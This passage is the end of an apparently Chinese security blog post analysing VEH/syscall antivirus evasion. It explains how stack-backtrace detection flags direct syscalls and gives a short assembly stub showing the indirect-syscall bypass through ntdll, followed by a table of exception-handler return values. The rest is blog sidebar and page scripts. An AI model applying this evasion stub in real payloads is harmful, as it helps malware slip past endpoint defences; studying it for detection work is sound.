+<p>![image-20240228164732206](picture&#x2F;VEH syscall 免杀分析&#x2F;57d29b31-7d9e-49ee-b0d0-a2426f24f042.png)</p>
+<p><strong>栈回溯检测syscall</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常系统调用时，主程序模块-&gt;kernel32.dll-&gt;ntdll.dll-&gt;syscall，这样当0环执行结束返回3环的时候，这个返回地址应该是在ntdll所在的地址范围之内。直接调用syscall时，rip将会是你的主程序模块内，而并不是在ntdll所在的范围内。</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220310014525396](picture&#x2F;VEH syscall 免杀分析&#x2F;9aebd248-a441-4aec-931d-e09c705897bf.png)</p>
+<p>当然同样很好绕过，使用间接调用，也就是在ntdll中调用syscall stub的末尾部分，调用完成后会返回到ntdll，即syscall和return指令在 ntdll.dll 内存中的syscall stub执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.CODE  ; indirect syscalls assembly code</span><br><span class="line">; Procedure <span class="keyword">for</span> the NtAllocateVirtualMemory syscall</span><br><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">    mov r10, rcx                  ; Move the contents of rcx to r10. This is necessary because the syscall instruction in <span class="number">64</span>-bit Windows expects the parameters to be in the r10 and rdx registers.</span><br><span class="line">    mov eax, <span class="number">18</span>h                  ; Move the syscall number into the eax <span class="keyword">register</span>.</span><br><span class="line">    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall memory address in ntdll.dll</span><br><span class="line">NtAllocateVirtualMemory ENDP      ; End of the procedure</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Exception-Handler返回值</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">EXCEPTION_EXECUTE_HANDLER</td>
+<td align="left">系统将控制权转移到异常处理程序，并在找到处理程序的堆栈帧中继续执行。</td>
+</tr>
+<tr>
+<td align="left">EXCEPTION_CONTINUE_SEARCH</td>
+<td align="left">系统继续搜索处理程序。</td>
+</tr>
+<tr>
+<td align="left">EXCEPTION_CONTINUE_EXECUTION</td>
+<td align="left">系统停止对处理程序的搜索，并将控制权返回到发生异常的点。 如果异常不可持续，则会导致 <strong>EXCEPTION_NONCONTINUABLE_EXCEPTION</strong> 异常。</td>
+</tr>
+</tbody></table>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c0ke.top">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0ke.top/2025/07/15/VEH%20syscall%20%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90/">http://c0ke.top/2025/07/15/VEH%20syscall%20%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c0ke.top" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/15/VIM%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" title="VIM使用教程"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VIM使用教程</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/15/usrincludestdio.h2710%20fatal%20error%20bitslibc-header-start.h%20No%20such%20file%20or%20directory%20%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/" title="usrincludestdio.h2710 fatal error bitslibc-header-start.h No such file or directory 报错解决"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">usrincludestdio.h2710 fatal error bitslibc-header-start.h No such file or directory 报错解决</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VEH-syscall-%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">VEH syscall 免杀分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VEH-syscall"><span class="toc-number">1.2.</span> <span class="toc-text">VEH syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E7%9A%84VEH-syscall%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">免杀的VEH syscall的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">为什么需要绕过安全检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">杀毒软件的检测机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VEH-syscall%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">VEH syscall原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">1.4.</span> <span class="toc-text">后记</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tenda-FH1201多处命令注入漏洞分析和复现"/></a><div class="content"><a class="title" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现">Tenda-FH1201多处命令注入漏洞分析和复现</a><time datetime="2025-07-30T03:04:06.916Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GL-iNet 路由器 CVE-2024-39226 漏洞分析"/></a><div class="content"><a class="title" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析">GL-iNet 路由器 CVE-2024-39226 漏洞分析</a><time datetime="2025-07-30T03:04:06.914Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="启动路由器环境"/></a><div class="content"><a class="title" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境">启动路由器环境</a><time datetime="2025-07-30T03:04:06.907Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复路由器程序运行环境+远程调试"/></a><div class="content"><a class="title" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试">修复路由器程序运行环境+远程调试</a><time datetime="2025-07-30T03:04:06.906Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ikuai-3.7.10版本以下有授权的cmd执行复现"/></a><div class="content"><a class="title" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现">ikuai-3.7.10版本以下有授权的cmd执行复现</a><time datetime="2025-07-30T03:04:06.904Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
